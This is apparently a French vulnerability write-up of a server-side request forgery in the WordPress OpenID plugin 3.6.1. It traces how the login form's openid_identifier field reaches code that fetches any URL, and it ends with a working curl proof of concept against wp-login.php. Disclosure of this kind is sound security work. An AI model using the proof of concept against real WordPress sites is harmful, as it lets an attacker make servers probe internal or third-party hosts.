---
title: "SSRF dans le plugin Wordpress OpenID"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [OpenID](https://wordpress.org/plugins/openid/) se présente de cette façon :

> OpenID is an open standard that allows users to authenticate to websites without having to create a new password. This plugin allows users to login to their local WordPress account using an OpenID, as well as enabling commenters to leave authenticated comments with OpenID. The plugin also includes an OpenID provider, enabling users to login to OpenID-enabled sites using their own personal WordPress account. XRDS-Simple is required for the OpenID Provider and some features of the OpenID Consumer.
>
> Developer documentation, which includes all of the public methods and hooks for integrating with and extending the plugin, can be found here.

La version testée est la 3.6.1 et date d'il y a 1 an au moment de ces lignes.

## La vulnérabilité

Le script `login.php` hooke différentes fonctions du Wordpress dont celle affichant la page de login (sur `/wp-admin`) :

```php
add_action( 'login_form', 'openid_wp_login_form' );
```

L'objectif est d'ajouter un champ nommé `openid_identifier` :

```php
/**                                                                                                                    
 * Add OpenID input field to wp-login.php                                                                              
 *                                                                                                                     
 * @action: login_form                                                                                                 
 **/                                                                                                                   
function openid_wp_login_form() {                                                                                      
    echo '<hr id="openid_split" style="clear: both; margin-bottom: 1.0em; border: 0; border-top: 1px solid #999; height: 1px;" />';
                                                                                                                       
    echo '                                                                                                             
    <p style="margin-bottom: 8px;">                                                                                    
        <label style="display: block; margin-bottom: 5px;">' . __( 'Or login using an OpenID', 'openid' ) . '<br />    
        <input type="text" name="openid_identifier" id="openid_identifier" class="input openid_identifier" value="" size="20" tabindex="25" /></label>
    </p>                                                                                                               
                                                                                                                       
    <p style="font-size: 0.9em; margin: 8px 0 24px 0;" id="what_is_openid">                                            
        <a href="http://openid.net/what/" target="_blank">' . __( 'Learn about OpenID', 'openid' ) . '</a>             
    </p>';                                                                                                             
}
```

Ce champ est récupéré par un autre hook que voici :

```php
/**                                                                                                                    
 * Authenticate user to WordPress using OpenID.                                                                        
 *                                                                                                                     
 * @param mixed $user authenticated user object, or WP_Error or null                                                   
 */                                                                                                                    
function openid_authenticate( $user ) {                                                                                
    if ( array_key_exists( 'openid_identifier', $_POST ) && $_POST['openid_identifier'] ) {                            
                                                                                                                       
        $redirect_to = array_key_exists( 'redirect_to', $_REQUEST ) ? $_REQUEST['redirect_to'] : null;                 
        openid_start_login( $_POST['openid_identifier'], 'login', $redirect_to );                                      
                                                                                                                       
        // if we got this far, something is wrong                                                                      
        global $error;                                                                                                 
        $error = openid_message();                                                                                     
        $user  = new WP_Error( 'openid_login_error', $error );                                                         
                                                                                                                       
    } elseif ( array_key_exists( 'finish_openid', $_REQUEST ) ) {                                                      
                                                                                                                       
        $identity_url = $_REQUEST['identity_url'];                                                                     
                                                                                                                       
        if ( ! wp_verify_nonce( $_REQUEST['_wpnonce'], 'openid_login_' . md5( $identity_url ) ) ) {                    
            $user = new WP_Error( 'openid_login_error', __( 'Error during OpenID authentication.  Please try again. (invalid nonce)', 'openid' ) );
            return $user;                                                                                              
        }                                                                                                              
                                                                                                                       
        if ( $identity_url ) {                                                                                         
            $user_id = get_user_by_openid( $identity_url );                                                            
            if ( $user_id ) {                                                                                          
                $user = new WP_User( $user_id );                                                                       
            } else {                                                                                                   
                $user = new WP_Error( 'openid_registration_closed', __( 'Your have entered a valid OpenID, but this site is not currently accepting new accounts.', 'openid' ) );
            }                                                                                                          
        } elseif ( array_key_exists( 'openid_error', $_REQUEST ) ) {                                                   
            $user = new WP_Error( 'openid_login_error', htmlentities2( $_REQUEST['openid_error'] ) );                  
        }                                                                                                              
    }                                                                                                                  
                                                                                                                       
    return $user;                                                                                                      
}                                                                                                                      
add_action( 'authenticate', 'openid_authenticate' )
```

La fonction `openid_authenticate` récupère donc le champ `openid_identifier` et la passe à `openid_start_login`.

C'est cette fonction qui va, par l'intermédiaire d'une classe spécifique à OpenID (dans le dossier `lib/Auth/OpenID` du plugin), déclencher une requête HTTP à l'adresse indiquée par `$_POST['openid_identifier']`.

Voici un exemple de requête générée si la valeur passée est `http://perdu.com` :

```http
GET / HTTP/1.1
Host: perdu.com
User-Agent: php-openid/3.0.3 (php/8.0.30) curl/7.74.0
Accept: application/xrds+xml, text/html; q=0.3, application/xhtml+xml; q=0.5
```

PoC qui va demander `http://perdu.com/yolo` via le Wordpress :

```bash
curl "http://localhost:8000/wp-login.php" -d "log=toto&pwd=yolo&openid_identifier=http%3A%2F%2Fperdu.com%2Fyolo&wp-submit=Log%20In"
```

L'exploitation peut aussi bien se faire en remplissant les champs sur la page de login.
